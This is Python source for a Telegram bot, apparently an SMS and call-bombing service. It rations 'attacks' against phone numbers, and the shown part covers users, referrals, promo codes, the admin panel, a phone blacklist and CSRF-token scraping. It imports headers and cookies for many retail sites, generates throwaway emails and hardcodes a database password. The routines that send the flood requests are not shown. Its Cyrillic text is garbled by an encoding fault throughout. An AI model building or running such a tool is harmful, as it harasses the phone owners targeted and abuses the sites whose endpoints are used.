from aiogram import *
import fake_useragent
import asyncio
import logging
from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher import FSMContext
from aiogram.types import Message
from markups import checkSubMenu
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.utils.exceptions import BotBlocked, UserDeactivated, ChatNotFound
from aiohttp import BasicAuth
from headers_main import (
    headers_dnipro, headers_citrus, headers_easypay, cookies_citrus, cookies_dnipro,
    headers_uvape, cookies_uvape, headers_terravape, cookies_terravape,
    headers_moyo, cookies_moyo, headers_sushiya, headers_zolota, cookies_zolota,
    headers_avtoria, cookies_avtoria, headers_elmir, cookies_elmir, headers_elmir_call,
    cookies_elmir_call
)
import asyncpg
import config
import aiohttp
import random
import string
import re
from bs4 import BeautifulSoup 
from datetime import datetime, timedelta
import urllib.parse

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

ADMIN = [810944378]
channel_id = "-1003203193556"
message = ("–ü—Ä–∏–≤—ñ—Ç.\n–í–∞—à –≤–∏–±—ñ—Ä: üëá")

db_config = {
    'user': 'postgres',
    'password': 'kXcfoihheRhCgwJUzBCJxNpdSTZIRvmL',
    'database': 'railway',
    'host': 'postgres.railway.internal',
    'port': '5432',
}

# –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î–º–æ –ø—É–ª –∑'—î–¥–Ω–∞–Ω—å –∑–∞–º—ñ—Å—Ç—å –æ–¥–Ω–æ–≥–æ –∑'—î–¥–Ω–∞–Ω–Ω—è
db_pool = None

attack_flags = {}
# –ü—Ä–∞–ø–æ—Ä—Ü—ñ –¥–ª—è —Ä–æ–∑—ñ–≥—Ä–∞—à—ñ–≤
giveaway_flags = {}

storage = MemoryStorage()
bot = Bot(token=config.token)
dp = Dispatcher(bot, storage=storage)

async def init_db():
    global db_pool
    db_pool = await asyncpg.create_pool(**db_config, min_size=5, max_size=20)
    
    # –û—Ç—Ä–∏–º—É—î–º–æ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –±–æ—Ç–∞ –¥–ª—è –æ–±—Ä–æ–±–∫–∏ –∑–≥–∞–¥–æ–∫
    try:
        bot._me = await bot.get_me()
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –±–æ—Ç–µ: {e}")
    
    async with db_pool.acquire() as conn:
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id BIGINT PRIMARY KEY,
                name TEXT,
                username TEXT,
                block INTEGER DEFAULT 0,
                attacks_left INTEGER DEFAULT 3,
                promo_attacks INTEGER DEFAULT 0,
                referral_attacks INTEGER DEFAULT 0,
                unused_referral_attacks INTEGER DEFAULT 0,
                last_attack_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                referrer_id BIGINT,
                referral_count INTEGER DEFAULT 0,
                referral_notification_sent BOOLEAN DEFAULT FALSE
            );
            CREATE TABLE IF NOT EXISTS blacklist (
                phone_number TEXT PRIMARY KEY
            );
            CREATE TABLE IF NOT EXISTS referrals (
                id SERIAL PRIMARY KEY,
                referrer_id BIGINT,
                referred_id BIGINT,
                join_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                UNIQUE(referred_id)
            );
            CREATE TABLE IF NOT EXISTS user_messages (
                id SERIAL PRIMARY KEY,
                user_id BIGINT,
                message_text TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS promocodes (
                id SERIAL PRIMARY KEY,
                code TEXT UNIQUE NOT NULL,
                attacks_count INTEGER NOT NULL,
                valid_until TIMESTAMP NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_active BOOLEAN DEFAULT TRUE
            );
            CREATE TABLE IF NOT EXISTS promo_activations (
                id SERIAL PRIMARY KEY,
                user_id BIGINT,
                promo_code TEXT,
                activated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                expires_at TIMESTAMP NOT NULL,
                attacks_added INTEGER,
                UNIQUE(user_id, promo_code)
            );
        ''')
        
        # –î–æ–¥–∞—î–º–æ –Ω–æ–≤—ñ –∫–æ–ª–æ–Ω–∫–∏ —è–∫—â–æ —ó—Ö –Ω–µ–º–∞—î
        try:
            await conn.execute('ALTER TABLE users ADD COLUMN IF NOT EXISTS promo_attacks INTEGER DEFAULT 0')
        except Exception as e:
            logging.error(f"Error adding promo_attacks column: {e}")
        
        try:
            await conn.execute('ALTER TABLE users ADD COLUMN IF NOT EXISTS referral_count INTEGER DEFAULT 0')
        except Exception as e:
            logging.error(f"Error adding referral_count column: {e}")
        
        try:
            await conn.execute('ALTER TABLE users ADD COLUMN IF NOT EXISTS referrer_id BIGINT')
        except Exception as e:
            logging.error(f"Error adding referrer_id column: {e}")

        try:
            await conn.execute('ALTER TABLE users ADD COLUMN IF NOT EXISTS referral_notification_sent BOOLEAN DEFAULT FALSE')
        except Exception as e:
            logging.error(f"Error adding referral_notification_sent column: {e}")
            
        try:
            await conn.execute('ALTER TABLE users ALTER COLUMN last_attack_date TYPE TIMESTAMP USING last_attack_date::timestamp')
        except Exception as e:
            logging.error(f"Error changing last_attack_date column type: {e}")

class Dialog(StatesGroup):
    spam = State()
    block_user = State()
    unblock_user = State()
    create_promo = State()
    create_promo_attacks = State()
    create_promo_hours = State()
    delete_promo = State()
    enter_promo = State()

async def email():
    name_length = random.randint(6, 12)
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=name_length))
    generated_email = f"{name}@gmail.com"
    logging.info(f"email: {generated_email}")
    return generated_email

async def get_csrf_token(url, headers=None):
    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers) as response:
            html = await response.text()
            soup = BeautifulSoup(html, "html.parser")

            csrf_token = soup.find("input", {"name": "_csrf"})
            if csrf_token:
                return csrf_token.get("value")
            
            meta_token = soup.find("meta", {"name": "csrf-token"})
            if meta_token:
                return meta_token.get("content")
            
            raise ValueError("CSRF-—Ç–æ–∫–µ–Ω –Ω–µ –Ω–∞–π–¥–µ–Ω.")

def get_cancel_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("üõë –ó—É–ø–∏–Ω–∏—Ç–∏ –∞—Ç–∞–∫—É", callback_data="cancel_attack"))
    return keyboard

async def check_subscription_status(user_id):
    try:
        member = await bot.get_chat_member(chat_id=channel_id, user_id=user_id)
        if member.status in {"member", "administrator", "creator"}:
            return True
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞: {e}")
    return False

async def anti_flood(*args, **kwargs):
    m = args[0]
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —â–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ –æ—Å–æ–±–∏—Å—Ç–æ–≥–æ —á–∞—Ç—É
    if m.chat.type == 'private':
        await m.answer("–î–æ—Å–∏—Ç—å —Å–ø–∞–º–∏—Ç–∏!")

# –û–Ω–æ–≤–ª—é—î–º–æ –∫–ª–∞–≤—ñ–∞—Ç—É—Ä–∏
profile_button = types.KeyboardButton('üéØ –ü–æ—á–∞—Ç–∏ –∞—Ç–∞–∫—É')
referal_button = types.KeyboardButton('üÜò –î–æ–ø–æ–º–æ–≥–∞')
referral_program_button = types.KeyboardButton('üé™ –ó–∞–ø—Ä–æ—Å–∏—Ç–∏ –¥—Ä—É–≥–∞')
# promo_button = types.KeyboardButton('–ü—Ä–æ–º–æ–∫–æ–¥ üéÅ')  # –ü—Ä–∏–±—Ä–∞–Ω–æ
profile_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True).add(profile_button, referal_button).add(referral_program_button)

admin_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
admin_keyboard.add("–ù–∞–¥—ñ—Å–ª–∞—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º")
admin_keyboard.add("–î–æ–¥–∞—Ç–∏ –Ω–æ–º–µ—Ä –¥–æ —á–æ—Ä–Ω–æ–≥–æ —Å–ø–∏—Å–∫—É")
admin_keyboard.add("–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –±–æ—Ç–∞")
admin_keyboard.add("–ó–∞–±–ª–æ–∫—É–≤–∞—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞")
admin_keyboard.add("–†–æ–∑–±–ª–æ–∫—É–≤–∞—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞")
admin_keyboard.add("–†–µ—Ñ–µ—Ä–∞–ª–∏")
admin_keyboard.add("–°—Ç–≤–æ—Ä–∏—Ç–∏ –ø—Ä–æ–º–æ–∫–æ–¥")
admin_keyboard.add("–í–∏–¥–∞–ª–∏—Ç–∏ –ø—Ä–æ–º–æ–∫–æ–¥")
admin_keyboard.add("–°–ø–∏—Å–æ–∫ –ø—Ä–æ–º–æ–∫–æ–¥—ñ–≤")
admin_keyboard.add("–ù–∞–∑–∞–¥")

def generate_promo_code():
    """–ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç –ø—Ä–æ–º–æ–∫–æ–¥ –∏–∑ –∑–∞–≥–ª–∞–≤–Ω—ã—Ö –±—É–∫–≤ –∏ —Ü–∏—Ñ—Ä –¥–ª–∏–Ω–æ–π 10-20 —Å–∏–º–≤–æ–ª–æ–≤"""
    length = random.randint(10, 20)
    characters = string.ascii_uppercase + string.digits
    return ''.join(random.choices(characters, k=length))

async def add_user(user_id: int, name: str, username: str, referrer_id: int = None):
    today = datetime.now().date()
    async with db_pool.acquire() as conn:
        await conn.execute(
            'INSERT INTO users (user_id, name, username, block, attacks_left, promo_attacks, referral_attacks, unused_referral_attacks, last_attack_date, referrer_id) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10) ON CONFLICT (user_id) DO NOTHING',
            user_id, name, username, 0, 3, 0, 0, 0, today, referrer_id
        )
        
        if referrer_id:
            await conn.execute(
                'INSERT INTO referrals (referrer_id, referred_id) VALUES ($1, $2) ON CONFLICT (referred_id) DO NOTHING',
                referrer_id, user_id
            )
            
            await conn.execute(
                'UPDATE users SET referral_attacks = referral_attacks + 2, referral_count = referral_count + 1 WHERE user_id = $1',
                referrer_id
            )

            try:
                ref_name = username or name or f"User{user_id}"
                await bot.send_message(
                    referrer_id,
                    f"üéâ –ó–∞ –≤–∞—à–∏–º –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º –ø—Ä–∏—î–¥–Ω–∞–≤—Å—è –Ω–æ–≤–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á: <a href='tg://user?id={user_id}'>{ref_name}</a>\nüöÄ –í–∏ –æ—Ç—Ä–∏–º–∞–ª–∏ +2 –¥–æ–¥–∞—Ç–∫–æ–≤—ñ –∞—Ç–∞–∫–∏!",
                    parse_mode='HTML'
                )
            except Exception as e:
                logging.error(f"Error notifying referrer {referrer_id}: {e}")
        
        profile_link = f'<a href="tg://user?id={user_id}">{name}</a>'
        for admin_id in ADMIN:
            try:
                await bot.send_message(admin_id, f"–ù–æ–≤–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –∑–∞—Ä–µ—î—Å—Ç—Ä—É–≤–∞–≤—Å—è —É –±–æ—Ç—ñ:\n–Ü–º'—è: {profile_link}", parse_mode='HTML')
            except Exception as e:
                logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –∞–¥–º–∏–Ω—É {admin_id}: {e}")

async def startuser(message:types.Message):
    user_id = message.from_user.id
    if await check_subscription_status(user_id):
        await message.answer(message, reply_markup=profile_keyboard)
    else:
        await message.answer("–í–∏ –Ω–µ –ø—ñ–¥–ø–∏—Å–∞–Ω—ñ", reply_markup=checkSubMenu)

@dp.message_handler(commands=['start'])
async def start(message: Message):
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —â–æ –∫–æ–º–∞–Ω–¥–∞ –∑ –æ—Å–æ–±–∏—Å—Ç–æ–≥–æ —á–∞—Ç—É
    if message.chat.type != 'private':
        return  # –Ü–≥–Ω–æ—Ä—É—î–º–æ –∫–æ–º–∞–Ω–¥—É /start –≤ –≥—Ä—É–ø–∞—Ö
    
    user_id = message.from_user.id
    args = message.get_args()
    referrer_id = None
    if args and args.isdigit():
        referrer_id = int(args)
        if referrer_id == user_id:
            referrer_id = None
        else:
            async with db_pool.acquire() as conn:
                referrer_exists = await conn.fetchval('SELECT 1 FROM users WHERE user_id = $1', referrer_id)
                if not referrer_exists:
                    referrer_id = None
    
    if not await check_subscription_status(user_id):
        # –ó–±–µ—Ä—ñ–≥–∞—î–º–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è /start –∑ –∞—Ä–≥—É–º–µ–Ω—Ç–æ–º –¥–ª—è –ø–æ–¥–∞–ª—å—à–æ—ó –æ–±—Ä–æ–±–∫–∏ –ø—ñ—Å–ª—è –ø—ñ–¥–ø–∏—Å–∫–∏
        async with db_pool.acquire() as conn:
            await conn.execute(
                'INSERT INTO user_messages (user_id, message_text) VALUES ($1, $2)',
                user_id, message.text
            )
        logging.info(f"–ó–±–µ—Ä–µ–∂–µ–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è: user_id={user_id}, referrer_id={referrer_id}")
        await message.answer("–î–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –±–æ—Ç–∞ –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø—ñ–¥–ø–∏—Å–∞—Ç–∏—Å—è –Ω–∞ –Ω–∞—à –∫–∞–Ω–∞–ª!", reply_markup=checkSubMenu)
        return
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow('SELECT block FROM users WHERE user_id = $1', user_id)
    
    if message.from_user.id in ADMIN:
        await message.answer('–í–≤–µ–¥—ñ—Ç—å –∫–æ–º–∞–Ω–¥—É /admin', reply_markup=profile_keyboard)
    else:
        if result is None:
            # –ù–æ–≤–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á ‚Äî –¥–æ–¥–∞—î–º–æ –∑ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–∏–º id, —è–∫—â–æ —î
            await add_user(message.from_user.id, message.from_user.full_name, message.from_user.username, None)
            # –ü—ñ—Å–ª—è –¥–æ–¥–∞–≤–∞–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –Ω–∞—Ä–∞—Ö–æ–≤—É—î–º–æ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω—ñ –∞—Ç–∞–∫–∏, —è–∫—â–æ —î —Ä–µ—Ñ–µ—Ä–µ—Ä
            if referrer_id:
                await process_referral(referrer_id, message.from_user.id, message.from_user.username, message.from_user.full_name)
        
        if result and result['block'] == 1:
            await message.answer("–í–∞—Å –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–æ —ñ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ç–∏—Å—è –±–æ—Ç–æ–º.")
            return
        
        welcome_text = f"üéâ –í—ñ—Ç–∞—é, {message.from_user.first_name}!\n\n"
        welcome_text = '–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –±–æ—Ç–∞ –≤–∏ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –ø–æ–≥–æ–¥–∂—É—î—Ç–µ—Å—å –∑ <a href="https://telegra.ph/Umovi-vikoristannya-10-26-2">—É–º–æ–≤–∞–º–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è</a>\n\n'

        
        await bot.send_message(user_id, welcome_text, reply_markup=profile_keyboard, parse_mode='HTML')

@dp.callback_query_handler(text="subchanneldone")
async def process_subscription_confirmation(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    if await check_subscription_status(user_id):
        async with db_pool.acquire() as conn:
            user_exists = await conn.fetchval('SELECT 1 FROM users WHERE user_id = $1', user_id)
            
            if not user_exists:
                referrer_id = None
                try:
                    last_start_message = await conn.fetchval(
                        'SELECT message_text FROM user_messages WHERE user_id = $1 AND message_text LIKE \'/start%\' ORDER BY timestamp DESC LIMIT 1',
                        user_id
                    )
                    
                    logging.info(f"–ü–æ—Å–ª–µ–¥–Ω–µ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ /start: {last_start_message}")
                    
                    if last_start_message and ' ' in last_start_message:
                        args = last_start_message.split(' ')[1]
                        if args.isdigit():
                            referrer_id = int(args)
                            if referrer_id == user_id:
                                referrer_id = None
                            else:
                                referrer_exists = await conn.fetchval('SELECT 1 FROM users WHERE user_id = $1', referrer_id)
                                if not referrer_exists:
                                    referrer_id = None
                    
                    logging.info(f"–ù–∞–π–¥–µ–Ω referrer_id: {referrer_id}")
                except Exception as e:
                    logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ referrer_id: {e}")
                
                await add_user(callback_query.from_user.id, callback_query.from_user.full_name, callback_query.from_user.username, None)
                # –ü–æ—Å–ª–µ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–∞—á–∏—Å–ª—è–µ–º —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω—ã–µ –∞—Ç–∞–∫–∏, –µ—Å–ª–∏ –µ—Å—Ç—å —Ä–µ—Ñ–µ—Ä–µ—Ä
                if referrer_id:
                    await process_referral(referrer_id, callback_query.from_user.id, callback_query.from_user.username, callback_query.from_user.full_name)
                
                if referrer_id:
                    await conn.execute(
                        'UPDATE users SET referral_count = referral_count + 1 WHERE user_id = $1',
                        referrer_id
                    )
                    
                    await conn.execute(
                        'INSERT INTO referrals (referrer_id, referred_id) VALUES ($1, $2) ON CONFLICT (referred_id) DO NOTHING',
                        referrer_id, user_id
                    )
                    
                    logging.info(f"–î—Ä—É–≥ –∑–∞—Ä–∞—Ö–æ–≤–∞–Ω–∏–π: referrer_id={referrer_id}, referred_id={user_id}")
                    
                    referrer_data = await conn.fetchrow(
                        'SELECT referral_count, referral_notification_sent FROM users WHERE user_id = $1',
                        referrer_id
                    )
                    
                    if (referrer_data and 
                        referrer_data['referral_count'] >= 20 and 
                        not referrer_data['referral_notification_sent']):
                        for admin_id in ADMIN:
                            try:
                                await bot.send_message(
                                    admin_id,
                                    f"üéâ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å <a href='tg://user?id={referrer_id}'>@{callback_query.from_user.username or 'User'}</a> –¥–æ—Å—Ç–∏–≥ 20 —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤!",
                                    parse_mode='HTML'
                                )
                                await conn.execute(
                                    'UPDATE users SET referral_notification_sent = TRUE WHERE user_id = $1',
                                    referrer_id
                                )
                            except Exception as e:
                                logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–∏ –∞–¥–º–∏–Ω–∞ {admin_id}: {e}")
                
                welcome_text = f"üéâ –õ–∞—Å–∫–∞–≤–æ –ø—Ä–æ—Å–∏–º–æ, {callback_query.from_user.first_name}!\n\n"
                welcome_text += "üéØ –í–∏ —É—Å–ø—ñ—à–Ω–æ –ø—ñ–¥–ø–∏—Å–∞–ª–∏—Å—è —ñ —Ç–µ–ø–µ—Ä –º–æ–∂–µ—Ç–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ç–∏—Å—è –±–æ—Ç–æ–º.\n\n"
                
                await callback_query.message.edit_text(welcome_text, parse_mode='HTML')
                await callback_query.message.answer("–û–±–µ—Ä—ñ—Ç—å –¥—ñ—é:", reply_markup=profile_keyboard)
            else:
                welcome_text = f"üéâ –ó –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è–º, –¥—É–∂–µ –Ω–∞ —Ç–µ–±–µ —á–µ–∫–∞–ª–∏, {callback_query.from_user.first_name}!\n\n"

                
                await callback_query.message.edit_text(welcome_text, parse_mode='HTML')
                await callback_query.message.answer("–û–±–µ—Ä—ñ—Ç—å –¥—ñ—é:", reply_markup=profile_keyboard)
    else:
        await callback_query.answer("–í–∏ —â–µ –Ω–µ –ø—ñ–¥–ø–∏—Å–∞–ª–∏—Å—è –Ω–∞ –∫–∞–Ω–∞–ª!", show_alert=True)

@dp.message_handler(commands=['admin'])
async def admin(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer(f'{message.from_user.first_name}, –æ–±–µ—Ä—ñ—Ç—å –¥—ñ—éüëá', reply_markup=admin_keyboard)
    else:
        await message.answer('‚òùÔ∏è–í–∏ –Ω–µ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä')

# –ü–†–û–ú–û–ö–û–î–´ - –ê–î–ú–ò–ù –ü–ê–ù–ï–õ–¨

@dp.message_handler(text="–°–æ–∑–¥–∞—Ç—å –ø—Ä–æ–º–æ–∫–æ–¥")
async def create_promo_start(message: Message):
    if message.from_user.id in ADMIN:
        await Dialog.create_promo_attacks.set()
        await message.answer("–í–≤–µ–¥—ñ—Ç—å –∫—ñ–ª—å–∫—ñ—Å—Ç—å –∞—Ç–∞–∫ –¥–ª—è –ø—Ä–æ–º–æ–∫–æ–¥—É:")
    else:
        await message.answer("–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤.")

@dp.message_handler(state=Dialog.create_promo_attacks)
async def create_promo_attacks(message: Message, state: FSMContext):
    try:
        attacks = int(message.text)
        if attacks <= 0:
            await message.answer("–ö—ñ–ª—å–∫—ñ—Å—Ç—å –∞—Ç–∞–∫ –º–∞—î –±—É—Ç–∏ –±—ñ–ª—å—à–µ 0. –°–ø—Ä–æ–±—É–π—Ç–µ —â–µ —Ä–∞–∑:")
            return
        
        await state.update_data(attacks=attacks)
        await Dialog.create_promo_hours.set()
        await message.answer("–í–≤–µ–¥–∏—Ç–µ —Å—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è –ø—Ä–æ–º–æ–∫–æ–¥–∞ –≤ —á–∞—Å–∞—Ö (–≤—Ä–µ–º—è, –∑–∞ –∫–æ—Ç–æ—Ä–æ–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ —Å–º–æ–≥—É—Ç –≤–≤–µ—Å—Ç–∏ –ø—Ä–æ–º–æ–∫–æ–¥):")
    except ValueError:
        await message.answer("–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ —á–∏—Å–ª–æ. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞:")

@dp.message_handler(state=Dialog.create_promo_hours)
async def create_promo_hours(message: Message, state: FSMContext):
    try:
        hours = int(message.text)
        if hours <= 0:
            await message.answer("–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —á–∞—Å–æ–≤ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –±–æ–ª—å—à–µ 0. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞:")
            return
        
        data = await state.get_data()
        attacks = data['attacks']
        
        # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —É–Ω–∏–∫–∞–ª—å–Ω—ã–π –ø—Ä–æ–º–æ–∫–æ–¥
        async with db_pool.acquire() as conn:
            while True:
                promo_code = generate_promo_code()
                existing = await conn.fetchval('SELECT 1 FROM promocodes WHERE code = $1', promo_code)
                if not existing:
                    break
            
            # –°—Ç–≤–æ—Ä—é—î–º–æ –ø—Ä–æ–º–æ–∫–æ–¥
            valid_until = datetime.now() + timedelta(hours=hours)
            await conn.execute(
                'INSERT INTO promocodes (code, attacks_count, valid_until) VALUES ($1, $2, $3)',
                promo_code, attacks, valid_until
            )
        
        await message.answer(
            f"‚úÖ –ü—Ä–æ–º–æ–∫–æ–¥ —Å–æ–∑–¥–∞–Ω!\n\n"
            f"üéÅ –ö–æ–¥: <code>{promo_code}</code>\n"
            f"‚öîÔ∏è –ê—Ç–∞–∫: {attacks}\n"
            f"‚è∞ –î–µ–π—Å—Ç–≤—É–µ—Ç –¥–æ: {valid_until.strftime('%d.%m.%Y %H:%M')}\n"
            f"üìù –ü—Ä–æ–º–æ–∫–æ–¥ –º–æ–∂–Ω–æ –≤–≤–µ—Å—Ç–∏ –≤ —Ç–µ—á–µ–Ω–∏–µ {hours} —á–∞—Å–æ–≤\n"
            f"üïê –ü–æ—Å–ª–µ –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ –¥–µ–π—Å—Ç–≤—É–µ—Ç 24 —á–∞—Å–∞",
            parse_mode='HTML'
        )
        
        await state.finish()
    except ValueError:
        await message.answer("–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ —á–∏—Å–ª–æ. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞:")

@dp.message_handler(text="–£–¥–∞–ª–∏—Ç—å –ø—Ä–æ–º–æ–∫–æ–¥")
async def delete_promo_start(message: Message):
    if message.from_user.id in ADMIN:
        async with db_pool.acquire() as conn:
            promos = await conn.fetch('SELECT code, attacks_count, valid_until FROM promocodes WHERE is_active = TRUE ORDER BY created_at DESC')
        
        if not promos:
            await message.answer("–ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø—Ä–æ–º–æ–∫–æ–¥–æ–≤ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è.")
            return
        
        text = "üóëÔ∏è –ê–∫—Ç–∏–≤–Ω—ã–µ –ø—Ä–æ–º–æ–∫–æ–¥—ã:\n\n"
        for promo in promos:
            text += f"‚Ä¢ <code>{promo['code']}</code> - {promo['attacks_count']} –∞—Ç–∞–∫ (–¥–æ {promo['valid_until'].strftime('%d.%m.%Y %H:%M')})\n"
        
        text += "\n–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –ø—Ä–æ–º–æ–∫–æ–¥–∞ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è:"
        
        await Dialog.delete_promo.set()
        await message.answer(text, parse_mode='HTML')
    else:
        await message.answer("–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤.")

@dp.message_handler(state=Dialog.delete_promo)
async def delete_promo_process(message: Message, state: FSMContext):
    promo_code = message.text.strip().upper()
    
    async with db_pool.acquire() as conn:
        # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ —ñ—Å–Ω—É–≤–∞–Ω–Ω—è –ø—Ä–æ–º–æ–∫–æ–¥—É
        promo = await conn.fetchrow('SELECT * FROM promocodes WHERE code = $1 AND is_active = TRUE', promo_code)
        
        if not promo:
            await message.answer("–ü—Ä–æ–º–æ–∫–æ–¥ –Ω–µ –Ω–∞–π–¥–µ–Ω –∏–ª–∏ —É–∂–µ —É–¥–∞–ª–µ–Ω. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞:")
            return
        
        # –î–µ–∞–∫—Ç–∏–≤–∏—Ä—É–µ–º –ø—Ä–æ–º–æ–∫–æ–¥
        await conn.execute('UPDATE promocodes SET is_active = FALSE WHERE code = $1', promo_code)
    
    await message.answer(f"‚úÖ –ü—Ä–æ–º–æ–∫–æ–¥ <code>{promo_code}</code> —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω!", parse_mode='HTML')
    await state.finish()

@dp.message_handler(text="–°–ø–∏—Å–æ–∫ –ø—Ä–æ–º–æ–∫–æ–¥–æ–≤")
async def list_promos(message: Message):
    if message.from_user.id in ADMIN:
        async with db_pool.acquire() as conn:
            promos = await conn.fetch('''
                SELECT code, attacks_count, valid_until, created_at, is_active,
                       (SELECT COUNT(*) FROM promo_activations WHERE promo_code = code) as used_count
                FROM promocodes 
                ORDER BY created_at DESC
            ''')
        
        if not promos:
            await message.answer("–ü—Ä–æ–º–æ–∫–æ–¥–æ–≤ –ø–æ–∫–∞ –Ω–µ—Ç.")
            return
        
        text = "üìã <b>–í—Å–µ –ø—Ä–æ–º–æ–∫–æ–¥—ã:</b>\n\n"
        
        for promo in promos:
            status = "üü¢ –ê–∫—Ç–∏–≤–µ–Ω" if promo['is_active'] else "üî¥ –£–¥–∞–ª–µ–Ω"
            if promo['is_active'] and datetime.now() > promo['valid_until']:
                status = "‚è∞ –ò—Å—Ç–µ–∫"
            
            text += f"‚Ä¢ <code>{promo['code']}</code>\n"
            text += f"  ‚öîÔ∏è –ê—Ç–∞–∫: {promo['attacks_count']}\n"
            text += f"  üìÖ –°–æ–∑–¥–∞–Ω: {promo['created_at'].strftime('%d.%m.%Y %H:%M')}\n"
            text += f"  ‚è∞ –î–æ: {promo['valid_until'].strftime('%d.%m.%Y %H:%M')}\n"
            text += f"  üë• –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω: {promo['used_count']} —Ä–∞–∑\n"
            text += f"  üìä –°—Ç–∞—Ç—É—Å: {status}\n\n"
        
        await message.answer(text, parse_mode='HTML')
    else:
